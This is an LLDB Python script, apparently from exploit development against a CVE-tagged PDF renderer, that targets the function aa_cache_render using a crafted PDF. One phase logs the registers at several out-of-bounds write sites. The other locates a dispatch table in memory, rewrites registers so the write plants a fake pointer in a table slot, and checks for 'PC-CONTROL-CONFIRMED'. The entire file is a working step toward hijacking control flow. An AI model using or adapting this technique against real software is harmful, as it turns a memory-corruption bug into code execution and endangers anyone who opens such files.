# RIP-29: SITE-BP OBSERVER + REGISTER HIJACK.
# A: bps on the wild-write sites (+2476/+2540/+2644) -> every strike visible,
#    no guards/no faults: record (site, x2 target, x0 value, x27) + disasm.
# B: HIJACK — at a site stop, patch x2=slot addr (dispatch table), x0=FAKEPTR,
#    continue -> watch for crash at FAKEPTR = PC CONTROL.
import os, sys, struct, subprocess, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
sys.path.insert(0, CVE)
TRACE = open(os.path.join(CWD, "rip29_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()
FAKEPTR = 0x515100000

def qwords(p, addr, n):
    if addr < 0x100000: return None
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.05); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def pcoff(fr):
    a = safe_pc_addr(fr)
    try:
        if fr.GetSymbol() and a:
            return a - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
    except Exception: pass
    return -1

def codeish(q):
    return 0x100000000 <= q < 0x800000000 and (q & 3) == 0

def find_table(p, x27):
    best = None; bestn = 0; bestoff = -1
    for base in range(x27 - 0xC000, x27 + 0x8000, 0x1000):
        page = base & ~0xFFF
        qs = qwords(p, page, 0x1000//8)
        if not qs: continue
        n = sum(1 for q in qs if codeish(q))
        if n > bestn:
            off = -1
            for j in range(len(qs) - 6):
                if sum(1 for q in qs[j:j+24] if codeish(q)) >= 6:
                    off = j*8; break
            bestn = n; best = page; bestoff = off
    return best, bestn, bestoff

def reg(fr, name):
    r = fr.FindRegister(name)
    return r.GetValueAsUnsigned() if r and r.IsValid() else 0

def disasm_around(fr, back=8, fwd=8):
    try:
        pc = safe_pc_addr(fr)
        tgt = fr.GetThread().GetProcess().GetSelectedTarget()
        insts = tgt.ReadInstructions(lldb.SBAddress(pc - back, tgt), 6)
        out = []
        for ins in insts:
            out.append("%x %s %s" % (ins.GetAddress().GetLoadAddress(tgt), ins.GetMnemonic(target=tgt), ins.GetOperands(tgt)))
        return out
    except Exception as e:
        return ["disasm-err %s" % e]

SITES = [2476, 2540, 2644]
L = 31472

# ---- PHASE-A: observer ----
fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CVE)
site_bps = {}
x27 = 0; hits = []
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    if pc0:
        for s in SITES:
            site_bps[s] = t.BreakpointCreateByAddress(pc0 + s)
        n = 0
        for i in range(700):
            st = wait_stop(p)
            if st != lldb.eStateStopped: break
            fr = p.GetSelectedThread().GetSelectedFrame()
            off = pcoff(fr)
            if off in SITES:
                n += 1
                x2 = reg(fr, "x2"); x0 = reg(fr, "x0")
                if not x27: x27 = reg(fr, "x27")
                d = x2 - x27 if x27 else 0
                hits.append((off, x2, x0, d))
                if n <= 6 or n % 25 == 0:
                    T("A#%d site+%d x2=%x x0=%x delta=%d" % (n, off, x2, x0, d))
                    if n == 1:
                        for line in disasm_around(fr):
                            T("A disasm: %s" % line)
                p.Continue()
            else:
                p.Continue()
    killp(p)
for b in list(site_bps.values()): t.BreakpointDelete(b.GetID())
t.BreakpointDelete(be.GetID())
T("A site-hits=%d x27=%x" % (len(hits), x27))
deltas = [h[3] for h in hits]
T("A deltas(first40)=%s" % deltas[:40])

# ---- PHASE-B: hijack ----
# locate table in a fresh run, patch a strike into slot_mid with FAKEPTR
fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CVE)
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    slots_lo = 0; slot_mid = 0; x27b = 0
    site_bps = {}
    if pc0:
        for s in SITES:
            site_bps[s] = t.BreakpointCreateByAddress(pc0 + s)
    # first pass: wait for a walk-ish stop? simpler: use the FIRST site hit to scan table
    patched = False; n = 0; result = "no-patch"
    for i in range(700):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        off = pcoff(fr)
        if off in SITES:
            n += 1
            if not x27b:
                x27b = reg(fr, "x27")
                tp, tn, soff = find_table(p, x27b)
                if tp and soff >= 0:
                    slots_lo = tp + soff; slot_mid = slots_lo + 0x60
                    qs = qwords(p, slots_lo, 24)
                    T("B table=%x slots=[%x..] n=%d pre: %s" % (tp, slots_lo, tn, [hex(q) for q in (qs or [])][:8]))
            x2 = reg(fr, "x2"); x0 = reg(fr, "x0")
            # choose patch point: 4th site hit (mid-campaign, state warm)
            if not patched and n >= 4 and slots_lo:
                # sanity: slot target inside plausible arena
                fr2 = fr
                x2r = fr2.FindRegister("x2"); x0r = fr2.FindRegister("x0")
                x2r.SetValueFromCString("0x%x" % slot_mid)
                x0r.SetValueFromCString("0x%x" % FAKEPTR)
                patched = True
                T("B PATCH#%d site+%d: x2 %x -> %x, x0 %x -> %x" % (n, off, x2, slot_mid, x0, FAKEPTR))
                p.Continue()
                continue
            if n <= 8 or n % 25 == 0:
                T("B#%d site+%d x2=%x x0=%x delta=%d" % (n, off, x2, x0, x2 - x27b if x27b else 0))
            p.Continue()
        else:
            desc = p.GetSelectedThread().GetStopDescription(300) or ""
            pc = safe_pc_addr(fr) or 0
            T("B non-site stop off=%d pc=%x %s" % (off, pc, desc[:80]))
            if patched and (pc >> 20) == (FAKEPTR >> 20):
                result = "PC-CONTROL-CONFIRMED pc=%x" % pc
                killp(p); break
            p.Continue()
    killp(p)
    T("B result: %s (site-hits=%d patched=%s)" % (result, n, patched))
    for b in list(site_bps.values()): t.BreakpointDelete(b.GetID())
t.BreakpointDelete(be.GetID())
T("RIP-29 DONE")
TRACE.close()
